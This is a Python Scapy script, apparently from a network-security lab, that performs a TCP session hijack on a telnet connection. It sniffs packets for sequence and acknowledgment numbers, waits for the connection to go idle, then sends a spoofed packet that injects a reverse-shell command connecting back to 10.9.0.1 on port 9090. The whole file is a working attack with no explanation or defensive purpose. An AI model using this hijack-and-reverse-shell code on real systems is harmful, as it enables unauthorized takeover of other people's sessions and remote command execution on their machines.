#!/usr/bin/env python3
from scapy.all import *
import time
import threading

sequenceNumber = 0
ackNumber = 0
sourcePort = 0
lastPacketTime = None
timeout = 10 
done = False

def hijackConnection():
    """Crafts and sends a TCP A packet to terminate the connection."""
    global sequenceNumber, ackNumber, sourcePort, done
    print(f"\n[!] No packets seen for {timeout} seconds. Sending hijack command packet...")
    ip = IP(src="10.9.0.5", dst="10.9.0.6")
    # uses last seen sequence number and port to target the connection
    tcp = TCP(sport=sourcePort, dport=23, flags="A", seq=sequenceNumber, ack=ackNumber)
    data = "\nbash -i >& /dev/tcp/10.9.0.1/9090 0>&1\n"
    pkt = ip/tcp/data
    print("[+] Hijack packet details:")
    ls(pkt)
    
    send(pkt, verbose=0)
    done = True
    print("[+] Hijack packet sent. Exiting.")
    exit(0)

def process_packet(pkt):
    """Callback function to update state with each sniffed packet."""
    global sequenceNumber, ackNumber, sourcePort, lastPacketTime
    # Check if the packet has a TCP layer
    if TCP in pkt:
        lastPacketTime = time.time()
        sequenceNumber = pkt[TCP].seq
        ackNumber = pkt[TCP].ack
        sourcePort = pkt[TCP].sport
        print(f"[*] Packet sniffed. Seq: {sequenceNumber}, Ack: {ackNumber}, Port: {sourcePort}")

def check_for_hijack():
    """Continuously checks if the connection has timed out."""
    global lastPacketTime
    while True:
        # timeout has been exceeded and we did not see any packets
        if lastPacketTime is not None and (time.time() - lastPacketTime > timeout):
            hijackConnection()
            break 
        time.sleep(1)

# Start packet sniffing in a separate thread
# The sniff function will call process_packet for every TCP packet it sees
print("[*] Starting packet sniffer in the background...")
sniff_thread = threading.Thread(target=lambda: sniff(iface='br-82f1d76314d9', filter='tcp', prn=process_packet))
sniff_thread.daemon = True # Allows the main program to exit even if this thread is running
sniff_thread.start()

# Check for the hijack opportunity
if not done:
    print("[*] Monitoring for idle connection...")
    check_for_hijack()